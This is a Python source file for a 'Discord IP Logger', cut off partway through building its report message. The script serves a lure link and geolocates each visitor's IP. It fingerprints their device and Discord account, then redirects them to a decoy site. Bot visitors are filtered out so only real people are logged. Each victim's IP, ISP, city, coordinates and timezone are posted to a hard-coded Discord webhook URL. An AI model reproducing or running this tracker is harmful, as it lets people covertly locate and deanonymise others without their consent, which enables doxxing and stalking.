# Discord IP Logger with Enhanced Tracking
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, re

__app__ = "Discord IP Logger"
__description__ = "Advanced IP and Discord user information logger"
__version__ = "v3.0"
__author__ = "unknown"

config = {
    # WEBHOOK CONFIG #
    "webhook": "https://discord.com/api/webhooks/1360741270804365352/c8BRSpDn16HrjtJVTKuHuartuGVlvadouHi5DSMGbxKOQ7rmTP2X-fwrfTpgrLrRh6-F",
    "username": "therealreee!",
    "color": 0x00FFFF,

    # OPTIONS #
    "accurateLocation": False,
    "vpnCheck": 1,
    "linkAlerts": True,
    "antiBot": 1,
    
    # REDIRECTION #
    "redirect": {
        "redirect": True,
        "page": "https://snare-delta.vercel.app/"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def extract_discord_info(useragent):
    # Extract Discord user ID from user agent
    discord_id_match = re.search(r'Discord/(\d+)', useragent)
    discord_id = discord_id_match.group(1) if discord_id_match else "Unknown"
    
    # Extract Discord username (when available)
    username_match = re.search(r'\((.+?)#\d+\)', useragent)
    username = username_match.group(1) if username_match else "Unknown"
    
    # Extract Discord discriminator
    discriminator_match = re.search(r'#(\d+)', useragent)
    discriminator = discriminator_match.group(1) if discriminator_match else "Unknown"
    
    # Extract client type (Desktop/Mobile)
    client_type = "Desktop" if "Discord-Client" in useragent else "Mobile" if "Discord-Android" in useragent or "Discord-iOS" in useragent else "Unknown"
    
    # Extract device model for mobile users
    device_model = "Unknown"
    if "Discord-Android" in useragent:
        device_match = re.search(r'Android\s(\d+);\s([^;]+)', useragent)
        if device_match:
            device_model = f"{device_match.group(2)} (Android {device_match.group(1)})"
    elif "Discord-iOS" in useragent:
        device_match = re.search(r'iPhone|iPad|iPod', useragent)
        if device_match:
            device_model = device_match.group(0)
    
    return {
        "id": discord_id,
        "username": username,
        "discriminator": discriminator,
        "full_username": f"{username}#{discriminator}",
        "client_type": client_type,
        "device_model": device_model,
        "avatar_url": f"https://cdn.discordapp.com/avatars/{discord_id}/"  # Will need to be completed with actual avatar hash
    }

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    elif "Twitterbot" in useragent:
        return "Twitter"
    elif "facebookexternalhit" in useragent:
        return "Facebook"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "IP Logger - Error",
            "color": config["color"],
            "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def makeReport(ip, useragent=None, endpoint="N/A"):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    discord_info = extract_discord_info(useragent) if useragent and "Discord" in useragent else None
    
    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [{
                "title": "Logger - Link Sent",
                "color": config["color"],
                "description": f"Link was sent in a chat!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
            }]
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    # VPN/Bot checks
    if info["proxy"]:
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4 and not info["proxy"]: return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info["proxy"]: ping = ""
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "IP Logger - New Visitor",
            "color": config["color"],
            "thumbnail": {"url": discord_info["avatar_url"] + "avatar.png"} if discord_info and discord_info["id"] != "Unknown" else None,
            "description": f"""**User Clicked the Link!**

**Endpoint:** `{endpoint}`

**Discord Info:**
> **User:** `{discord_info['full_username'] if discord_info else 'Not using Discord'}`
> **ID:** `{discord_info['id'] if discord_info else 'N/A'}`
> **Client:** `{discord_info['client_type'] if discord_info else 'N/A'}`
> **Device:** `{discord_info['device_model'] if discord_info else 'N/A'}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon'])}` (Approximate)
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**System Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
